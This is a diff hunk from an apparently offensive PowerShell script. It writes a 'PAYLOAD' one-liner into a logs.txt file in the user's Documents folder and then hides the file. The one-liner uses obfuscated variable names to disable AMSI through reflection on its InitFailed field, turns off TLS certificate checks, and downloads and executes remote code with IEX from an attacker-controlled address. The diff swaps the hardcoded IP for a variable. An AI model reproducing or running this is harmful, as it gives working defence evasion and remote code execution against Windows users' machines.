@@ -112,7 +112,7 @@ if (Test-Path "C:\Users\$env:USERNAME\Documents\logs.txt") {
 } else {
 
     #echo PAYLOAD into file
-    $oneliner = "`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://192.168.1.50:8000/sc/eth0')"
+    $oneliner = ("`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://" + $ip + ":8000/sc/eth0')")
     echo $oneliner > "C:\Users\$env:USERNAME\Documents\logs.txt"
 
     #hide the file
